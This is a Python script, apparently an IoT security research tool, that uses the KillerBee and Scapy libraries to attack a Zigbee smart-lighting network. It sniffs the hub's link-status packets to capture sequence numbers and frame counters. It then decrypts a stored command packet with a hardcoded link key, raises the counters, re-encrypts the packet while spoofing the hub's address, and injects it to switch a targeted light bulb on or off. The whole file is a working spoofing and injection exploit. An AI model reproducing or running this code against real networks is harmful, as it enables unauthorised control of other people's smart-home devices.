__author__ = 'Soteria'

# 1. Sniff link-status and route request messages
# 2. Extract relevant sequence numbers:
    ## IEEE sequence number
    ## zigbee NWK sequence number
    ## security header - Frame Counter
# 3. Create new packet:
# 4. Change sequence numbers in the new packet
# 5. Create new packet data
# 6. Encrypt the data with the keyc1
# 7. Inject!

import logging
log_killerbee = logging.getLogger('scapy.killerbee')

import struct
try:
	from scapy.all import *
except ImportError:
	print 'This Requires Scapy To Be Installed.'
	from sys import exit
	exit(-1)

from killerbee import *
from killerbee.scapy_extensions import *

del hexdump
from scapy.utils import hexdump				# Force using Scapy's hexdump()
import os


DEFAULT_KB_CHANNEL = 11
DEFAULT_KB_DEVICE = '10.10.10.2'
SOURCE_DEVICE_ID = '0x0000' # Spoofed device ID (smart hub)

# FAULY_TARGET_DEVICE_ID = '0x055f' # old faulty light bulb to be hacked
TARGET_DEVICE_ID = '0xf973' # light bulb to be hacked

DEFAULT_ZIGBEE_APP_LAYER_COUNTER = 128
DEFAULT_ZIGBEE_CLUSTER_SEQ_NUM = 25
TURN_ON_COMMAND_CODE = '\x01'
TURN_OFF_COMMAND_CODE = '\x00'

LINK_KEY = '\xdf\x42\xb5\x95\x6a\x2b\xbd\x46\x18\x8d\x59\x0a\xdb\x04\xb6\x09'
#LINK_KEY = 'df42b5956a2bbd46188d590adb04b609'


# Sniff packets to a list, print it to screen and extract data:
found_hub_link_status = False
while not found_hub_link_status:
    packetsList = kbtshark(channel = DEFAULT_KB_CHANNEL, count = 1,iface = DEFAULT_KB_DEVICE, store = 1)
    print ""
    lastPacket = packetsList[0]
    if (lastPacket.payload.fields['src_addr'] == 0):
        found_hub_link_status = True


# Load command packet from file:
object_to_save = lastPacket

import dill
command_packet_file = "command_packet_format"

# Save object
#dill.dump(object_to_save, open(command_packet_file, "w"))

# Delete object:
#del object_to_save

# Load object:
loaded_object = dill.load(open(command_packet_file))

encrypted_command_packet = loaded_object
#temp

#hexdump(encrypted_command_packet)
#decrypted_command_packet_payload = kbdecrypt(encrypted_command_packet, key = LINK_KEY, verbose = 3)
#hexdump(decrypted_command_packet_payload)
# myPayload = decrypted_command_packet_payload.payload.fields['load']
#hexdump(myPayload)
#encrypted_command_packet_to_inject = kbencrypt(encrypted_command_packet, decrypted_command_packet_payload, key = LINK_KEY, verbose = 3)
#hexdump(encrypted_command_packet_to_inject.fields['data'])

## END Load command packet from file


# Decrypt packet
# kbdecrypt(pkt, key = None, verbose = None):
decrypted_command_packet_payload = kbdecrypt(encrypted_command_packet, key = LINK_KEY, verbose = 3)
packet_load = decrypted_command_packet_payload.payload.fields['load']
print ""
print "Original ZCL: " + packet_load.encode("hex")
cluster_seq_num_hex = struct.pack('<b', DEFAULT_ZIGBEE_CLUSTER_SEQ_NUM)

decrypted_command_packet_payload.payload.fields['load'] = packet_load[:1] + cluster_seq_num_hex + packet_load[2:3]
print "ZCL after fixing it: " + decrypted_command_packet_payload.payload.fields['load'].encode("hex")
print ""

ieee_seq_num = lastPacket.fields['seqnum']

ieee_data_layer = lastPacket.payload
ieee_panID = ieee_data_layer.fields['dest_panid']

zigbeeNWK_layer = lastPacket.getlayer(ZigbeeNWK)
zigbeeNWK_seq_num = zigbeeNWK_layer.fields['seqnum']

zigbee_security_layer = lastPacket.getlayer(ZigbeeSecurityHeader)
zigbee_frame_counter = zigbee_security_layer.fields['fc']


# Print last broadcast packet sequence numbers
print ""
print "Last sync packet sequence numbers:"
print "--------------"
print 'IEEE 802.15.4 sequence number = ' + str(ieee_seq_num)
print 'IEEE 802.15.4 PAN ID = ' + hex(ieee_panID)
print 'Zigbee NWK sequence number = ' + str(zigbeeNWK_seq_num)
print 'Zigbee frame counter = ' + str(zigbee_frame_counter)
print ""

# Advance injected packet sequence numbers
next_ieee_seq_num = ieee_seq_num + 1
next_zigbeeNWK_seq_num = zigbeeNWK_seq_num + 2
next_zigbee_frame_counter = zigbee_frame_counter + 1
next_zigbee_app_layer_counter = DEFAULT_ZIGBEE_APP_LAYER_COUNTER
next_zigbee_cluster_seq_num = DEFAULT_ZIGBEE_CLUSTER_SEQ_NUM


# Update command packet sequence numbers:
encrypted_command_packet.fields['seqnum'] = next_ieee_seq_num
encrypted_command_packet.payload.fields['dest_panid'] = ieee_panID
encrypted_command_packet.getlayer(ZigbeeNWK).fields['seqnum'] = next_zigbeeNWK_seq_num
encrypted_command_packet.getlayer(ZigbeeSecurityHeader).fields['fc'] = next_zigbee_frame_counter


#hexdump(decrypted_packet.data)
decrypted_command_packet_payload.fields['counter'] = next_zigbee_app_layer_counter
#decrypted_command_packet_payload.payload.payload.fields['seqnum'] = next_zigbee_cluster_seq_num
# Encrypt packet
encrypted_command_packet_to_inject = kbencrypt(encrypted_command_packet, decrypted_command_packet_payload, key = LINK_KEY, verbose = 3)

# Manual edit of the final packet:
# Adding the mic in the end plus remove the bytes after the encrypted payload:
mic = encrypted_command_packet_to_inject.getlayer(ZigbeeSecurityHeader).fields['mic']
hex_mic = hex(mic).split('x')[1]
#final_packet = encrypted_command_packet_to_inject[:-10] + hex_mic
print ""
print "Final packet to inject:"
encrypted_command_packet_to_inject.show()

# Send encrypted command
#kbsendp(pkt, channel = None, inter = 0, loop = 0, iface = None, count = None, verbose = None, realtime=None):
kbsendp(encrypted_command_packet_to_inject, channel = DEFAULT_KB_CHANNEL, inter = 0, loop = 0, iface = DEFAULT_KB_DEVICE, count = 5, verbose = 3)